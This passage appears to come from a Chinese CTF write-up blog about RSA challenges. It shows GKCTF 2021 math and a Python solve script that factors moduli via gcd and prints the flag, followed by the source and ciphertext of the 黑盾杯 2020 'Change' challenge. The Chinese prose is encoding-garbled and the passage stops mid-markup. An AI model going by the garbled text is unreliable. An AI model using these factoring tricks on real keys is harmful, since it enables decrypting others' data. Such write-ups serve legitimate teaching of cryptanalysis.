style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>æ ¹æ®è´¹é©¬å°å®šç†æœ‰</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>2</mn><mo>=</mo><mn>2021</mn><mo>âˆ—</mo><msub><mi>p</mi><mn>1</mn></msub><mo>+</mo><mn>212121</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>q</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">hint2=2021*p_1+212121\quad mod(q_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>å‡‘ä¸€ä¸‹é¡¹å¾—ï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>1</mn><mo>âˆ—</mo><mn>202</mn><msup><mn>1</mn><mn>202020</mn></msup><mo>=</mo><mo stretchy="false">(</mo><mn>2021</mn><mo>âˆ—</mo><mn>2020</mn><mo>âˆ—</mo><msub><mi>p</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mn>202020</mn></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>q</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">hint1*2021^{202020}=(2021*2020*p_1)^{202020}\quad mod(q_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mn>2</mn><mo>âˆ’</mo><mn>212121</mn><mo stretchy="false">)</mo><mo>âˆ—</mo><mn>2020</mn><msup><mo stretchy="false">)</mo><mn>202020</mn></msup><mo>=</mo><mo stretchy="false">(</mo><mn>2020</mn><mo>âˆ—</mo><mn>2121</mn><mo>âˆ—</mo><msub><mi>p</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mn>202020</mn></msup></mrow><annotation encoding="application/x-tex">((hint2-212121)*2020)^{202020}=(2020*2121*p_1)^{202020}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span></span></span></p><p>ä¸¤å¼ç›¸å‡å¯ä»¥å¾—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>k</mi><mn>1</mn></msub><mo>âˆ’</mo><msub><mi>k</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>âˆ—</mo><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">(k_1-k_2)*q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>è·Ÿnæ±‚gcdå³å¯å¾—åˆ°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><h3 id="æ±‚è§£q"><a class="markdownIt-Anchor" href="#æ±‚è§£q"></a> æ±‚è§£qï¼š</h3><p>åŸç†åŒä¸Š</p><h2 id="exp-11"><a class="markdownIt-Anchor" href="#exp-11"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>c=<span class="hljs-number">13492392717469817866883431475453770951837476241371989714683737558395769731416522300851917887957945766132864151382877462142018129852703437240533684604508379950293643294877725773675505912622208813435625177696614781601216465807569201380151669942605208425645258372134465547452376467465833013387018542999562042758</span><br>n1=<span class="hljs-number">75003557379080252219517825998990183226659117019770735080523409561757225883651040882547519748107588719498261922816865626714101556207649929655822889945870341168644508079317582220034374613066751916750036253423990673764234066999306874078424803774652754587494762629397701664706287999727238636073466137405374927829</span><br>c1=<span class="hljs-number">68111901092027813007099627893896838517426971082877204047110404787823279211508183783468891474661365139933325981191524511345219830693064573462115529345012970089065201176142417462299650761299758078141504126185921304526414911455395289228444974516503526507906721378965227166653195076209418852399008741560796631569</span><br>hint1=<span class="hljs-number">23552090716381769484990784116875558895715552896983313406764042416318710076256166472426553520240265023978449945974218435787929202289208329156594838420190890104226497263852461928474756025539394996288951828172126419569993301524866753797584032740426259804002564701319538183190684075289055345581960776903740881951</span><br>hint2=<span class="hljs-number">52723229698530767897979433914470831153268827008372307239630387100752226850798023362444499211944996778363894528759290565718266340188582253307004810850030833752132728256929572703630431232622151200855160886614350000115704689605102500273815157636476901150408355565958834764444192860513855376978491299658773170270</span><br>n2=<span class="hljs-number">114535923043375970380117920548097404729043079895540320742847840364455024050473125998926311644172960176471193602850427607899191810616953021324742137492746159921284982146320175356395325890407704697018412456350862990849606200323084717352630282539156670636025924425865741196506478163922312894384285889848355244489</span><br>c2=<span class="hljs-number">67054203666901691181215262587447180910225473339143260100831118313521471029889304176235434129632237116993910316978096018724911531011857469325115308802162172965564951703583450817489247675458024801774590728726471567407812572210421642171456850352167810755440990035255967091145950569246426544351461548548423025004</span><br>hint3=<span class="hljs-number">25590923416756813543880554963887576960707333607377889401033718419301278802157204881039116350321872162118977797069089653428121479486603744700519830597186045931412652681572060953439655868476311798368015878628002547540835719870081007505735499581449077950263721606955524302365518362434928190394924399683131242077</span><br>hint4=<span class="hljs-number">104100726926923869566862741238876132366916970864374562947844669556403268955625670105641264367038885706425427864941392601593437305258297198111819227915453081797889565662276003122901139755153002219126366611021736066016741562232998047253335141676203376521742965365133597943669838076210444485458296240951668402513</span><br>e=<span class="hljs-number">65537</span><br><span class="hljs-comment">#ä¸€</span><br>q1=gcd(n1,(hint1*(<span class="hljs-number">2021</span>**<span class="hljs-number">202020</span>)-<span class="hljs-built_in">pow</span>((hint2-<span class="hljs-number">212121</span>)*<span class="hljs-number">2020</span>,<span class="hljs-number">202020</span>,n1)))<br>p1=n1//q1<br><br>p=<span class="hljs-built_in">pow</span>(c1,invert(e,(p1-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>)),n1)<br><br><span class="hljs-comment">#äºŒ</span><br>q2=gcd(n2,<span class="hljs-built_in">pow</span>(hint3*<span class="hljs-number">2021</span>**<span class="hljs-number">202020</span>,<span class="hljs-number">212121</span>,n2)-<span class="hljs-built_in">pow</span>(hint4*<span class="hljs-number">2020</span>**<span class="hljs-number">212121</span>,<span class="hljs-number">202020</span>,n2))<br>p2=n2//q2<br><br>q=<span class="hljs-built_in">pow</span>(c2,invert(e,(p2-<span class="hljs-number">1</span>)*(q2-<span class="hljs-number">1</span>)),n2)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c,invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)),p*q)))<br><span class="hljs-comment">#b&#x27;GKCTF&#123;f64310b5-d5e6-45cb-ae69-c86600cdf8d8&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;f64310b5-d5e6-45cb-ae69-c86600cdf8d8&#125;</span><br></code></pre></td></tr></table></figure><h1 id="é»‘ç›¾æ¯-2020change"><a class="markdownIt-Anchor" href="#é»‘ç›¾æ¯-2020change"></a> [é»‘ç›¾æ¯ 2020]Change</h1><h2 id="é¢˜ç›®-12"><a class="markdownIt-Anchor" href="#é¢˜ç›®-12"></a> é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> FLAG<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = <span class="hljs-built_in">int</span>(gmpy2.next_prime(random.randint(<span class="hljs-number">10</span>**<span class="hljs-number">399</span>, <span class="hljs-number">10</span>**<span class="hljs-number">400</span>-<span class="hljs-number">1</span>)))<br>    q = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(p)[<span class="hljs-number">200</span>:]+<span class="hljs-built_in">str</span>(p)[:<span class="hljs-number">200</span>])<br>    <span class="hljs-keyword">if</span> gmpy2.is_prime(q):<br>        <span class="hljs-keyword">break</span><br><br>m = bytes_to_long(FLAG)<br>n = p*q<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;enc&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-built_in">str</span>(c))<br>    f.write(<span class="hljs-string">&quot;\n&quot;</span>)<br>    f.write(<span class="hljs-built_in">str</span>(n))<br><span class="hljs-comment">#182812482972168423884795132699225934365072979206288632257180603530046820174392675977209758378734399146216742345585898385168866887000708558119959898992294085847474548306743585711154035585848291290988967352517174312220756638881837930962458861193652684492265539096477345065113556380573776423787885892688197584678128636231428194711357642971544417113415626331810909274966752557628893585198569815939514862013512237657828262360291726912615575646318630641527418369988268899879152029186728850816178597399494254385226049249357897840618728804680238123954207656671747782543031545429711152272581734051959578453680011676521727918037340906791388178004979453256050227967701258768070039292546964652071924183467364467145178290753361477912582242961929982420950384199259355122986865808523351306098081481072454093823090</span><br><span class="hljs-comment">#438980397031315392229453908048509540832246041631432878509579665664182747463100230160823865621798053164989325086085003940181731721089701380743698761443812523024144817205902380903062054138730658451286904347536210833160924917347633148983052015550354913154312162901555870494273903714349869746793861874257201085777893961715468950661641778512110325457371446203379767458862059193946434683324578530163650541637261158037041205642428802942295011562277084687025213626698849526240663754073508102229066475773893638716845176469070938803298515155140240970836387785401085919369741520890271902332951669953411373633688944162470994856654604872287103746922041844065053274059990595496159866206551119361036237431289830985174384522423364811997241255005514248198447925396378192915553898993758660041223393168707380580012437</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-12"><a class="markdownIt-Anchor" href="#åˆ†æ-12"></a> åˆ†æ</h2><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>p</mi><mo>=</mo><msub><mi>p</mi><mi>h</mi></msub><mo>âˆ—</mo><mn>1</mn><msup><mn>0</mn><mn>200</mn></msup><mo>+</mo><msub><mi>p</mi><mi>l</mi></msub><mspace linebreak="newline"></mspace><mi>q</mi><mo>=</mo><msub><mi>p</mi><mi>l</mi></msub><mo>âˆ—</mo><mn>1</mn><msup><mn>0</mn><mn>200</mn></msup><mo>+</mo><msub><mi>p</mi><mi>h</mi></msub><mspace linebreak="newline"></mspace><mi>n</mi><mo>=</mo><mn>1</mn><msup><mn>0</mn><mn>400</mn></msup><mo>âˆ—</mo><msub><mi>p</mi><mi>h</mi></msub><mo>âˆ—</mo><msub><mi>p</mi><mi>l</mi></msub><mo>+</mo><mn>1</mn><msup><mn>0</mn><mn>200</mn></msup><mo>âˆ—</mo><msubsup><mi>p</mi><mi>h</mi><mn>2</mn></msubsup><mo>+</mo><mn>1</mn><msup><mn>0</mn><mn>200</mn></msup><mo>âˆ—</mo><msubsup><mi>p</mi><mi>l</mi><mn>2</mn></msubsup><mo>+</mo><msub><mi>p</mi><mi>h</mi></msub><mo>âˆ—</mo><msub><mi>p</mi><mi>l</mi></msub></mrow><annotation encoding="application/x-tex">p=p_h*10^{200}+p_l \\q=p_l*10^{200}+p_h \\n=10^{400}*p_h*p_l+10^{200}*p_h^2+10^{200}*p_l^2+p_h*p_l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t 